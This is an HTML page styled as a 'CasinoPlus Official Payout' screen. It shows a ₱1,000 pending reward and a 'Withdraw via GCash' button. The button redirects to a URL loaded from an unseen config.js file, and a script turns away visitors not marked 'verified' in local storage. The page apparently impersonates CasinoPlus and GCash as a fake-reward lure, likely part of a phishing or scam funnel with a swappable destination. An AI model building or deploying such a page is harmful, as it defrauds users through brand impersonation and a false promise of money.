<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>CasinoPlus | Official Payout</title>

    <script>
        (function() {
            const isBanned = localStorage.getItem("cp_device_locked") === "true";
            const isVerified = localStorage.getItem("cp_verified") === "true";
            if (isBanned || !isVerified) {
                window.location.replace("index.html"); 
            }
        })();
    </script>

    <link href="https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;800&family=Orbitron:wght@700&display=swap" rel="stylesheet">
    <style>
        :root { --gold: linear-gradient(180deg, #ffdc6a 0%, #d4af37 100%); --dark-bg: #04070d; }
        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        body { font-family: 'Public Sans', sans-serif; background-color: var(--dark-bg); background-image: radial-gradient(circle at 50% 0%, #1e3a8a 0%, transparent 70%); color: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 15px; }
        .card { background: rgba(255, 255, 255, 0.03); width: 100%; max-width: 400px; padding: 35px 20px; border-radius: 30px; border: 1px solid rgba(212, 175, 55, 0.3); backdrop-filter: blur(15px); text-align: center; }
        .logo-img { width: 180px; margin-bottom: 20px; }
        .amount { font-family: 'Orbitron', sans-serif; font-size: 48px; background: var(--gold); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 30px; }
        .pay-button { background: var(--gold); color: #000; width: 100%; padding: 20px; border: none; border-radius: 15px; font-size: 18px; font-weight: 800; text-transform: uppercase; cursor: pointer; box-shadow: 0 8px 0 #8b6508; transition: 0.2s; }
        .pay-button:active { transform: translateY(4px); box-shadow: 0 4px 0 #8b6508; }
        .promo-photo { width: 100%; border-radius: 20px; margin-top: 25px; border: 1px solid rgba(212, 175, 55, 0.2); }
    </style>
</head>
<body>

<div class="card">
    <img src="https://xjiligames.github.io/rewards/logo1.png" class="logo-img">
    <div style="font-size: 12px; color: #fbbf24; letter-spacing: 2px;">PENDING REWARD</div>
    <div class="amount" id="balanceText">₱1,000.00</div>
    <button class="pay-button" id="claimBtn" onclick="redirectToGCash()">Withdraw via GCash</button>
    <img src="https://xjiligames.github.io/rewards/casinoplus.jpeg" class="promo-photo">
</div>

<script src="config.js"></script>
<script>
    function redirectToGCash() {
        const btn = document.getElementById('claimBtn');
        btn.disabled = true; btn.innerHTML = "CONNECTING...";
        
        setTimeout(() => {
            if (typeof LATEST_GCASH_URL !== 'undefined') {
                window.location.href = LATEST_GCASH_URL; 
            } else {
                window.location.href = "https://m.gcash.com"; 
            }
        }, 1500);
    }
</script>
</body>
</html>
